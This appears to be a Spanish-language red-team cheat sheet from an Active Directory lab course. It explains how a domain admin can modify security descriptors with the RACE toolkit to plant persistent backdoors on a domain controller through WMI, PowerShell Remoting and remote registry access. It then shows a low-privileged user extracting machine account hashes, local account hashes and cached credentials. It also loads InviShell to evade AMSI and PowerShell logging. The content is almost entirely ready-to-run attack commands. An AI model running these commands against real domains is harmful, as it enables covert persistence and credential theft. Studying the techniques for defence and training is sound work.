# Security Descriptors using ACLs 

Tags: #AD #Windows #Powershell #ACL 

```bash 
- Es posible modificar los 'Security Descriptors' (información de seguridad como Owner, primary group, DACL y SACL) de múltiples métodos de acceso remoto (objetos securizables) para permitir acceso a usuarios no administradores.
- Se requieren privilegios administrativos para realizar esto.
- Evidentemente, funciona como un mecanismo de 'backdoor' muy útil y de alto impacto.
- El 'Security Descriptor Definition Language (SDDL)' define el formato utilizado para describir un security descriptor. SDDL utiliza cadenas 'ACE' para la DACL y la SACL:
	ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
	
- Ejemplo de ACE para administradores integrados en _namespaces_ de WMI:
	A;CI;CCDCLCSWRPWPRCWD;;;SID
```

## WMI

```powershell 
! Usuario: Domain Admin

❯ C:\AD\Tools\RACE-master\RACE.ps1
# Cargar el toolkit RACE para modificar ACLs y otorgar acceso a objetos protegidos a usuarios no administradores.

❯ Set-RemoteWMI -SamAccountName student1 -Verbose
# Otorgar permisos WMI remotos a un usuario en la máquina local.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose 
❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose -remove 

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
# Otorgar permisos WMI remotos a un usuario en una máquina remota sin credenciales explícitas.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
# Otorgar permisos WMI remotos a un usuario en una máquina remota usando credenciales explícitas — aplica solo a root\cimv2 y namespaces anidados.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
# Revocar los permisos WMI remotos otorgados previamente a un usuario en una máquina remota.
```

```powershell 
! Usuario: Administrador local

❯ C:\AD\InviShell\RunWithPathAsAdmin.bat
# Cargar InviShell con privilegios de administrador — evade la transcripción, AMSI y logging de PowerShell.

❯ gwmi -class win32_operatingsystem -ComputerName dcorp-dc
# Verificar conectividad y acceso WMI hacia un equipo remoto consultando información del sistema operativo.
```

## PowerShell Remoting

```powershell 
! Usuario: Domain Admin

❯ Set-RemotePSRemoting -SamAccountName student1 -Verbose
# Otorgar permisos de PS Remoting a un usuario en la máquina local vía RACE toolkit — no estable después de los parches de agosto 2020.

❯ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
# Otorgar permisos de PS Remoting a un usuario en una máquina remota sin credenciales explícitas. Nota: Si sale un error I/O es normal y aun así se puede ingresar a la sesión 

❯ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
# Revocar los permisos de PS Remoting otorgados previamente a un usuario en una máquina remota.

Notas:
	1. Usar RACE toolkit - El PS Remoting backdoor no es estable desde los parches de agosto 2020
```

```powershell 
! Usuario: Domain Admin o usuario de dominio con permisos de PS Remoting

❯ Enter-PSSession dcorp-dc     # Ingresar a la sesión 
	❯ $env:username 
	❯ whoami /all 
```

## Remote Registry

```powershell 
! Usuario: Domain Admin
❯ Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
# Agregar un backdoor en el registro remoto del DC para que un usuario sin privilegios pueda extraer hashes posteriormente vía RACE o DAMP.
```

```powershell
! Usuario: Usuario de dominio (con backdoor de registro configurado previamente)

❯ C:\AD\Tools\RACE.ps1

❯ Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
# Extraer el hash de la cuenta de máquina del DC de forma remota abusando del backdoor de registro.

❯ Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
# Extraer los hashes de cuentas locales del DC de forma remota abusando del backdoor de registro.

❯ Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
# Extraer credenciales cacheadas del DC de forma remota abusando del backdoor de registro.
```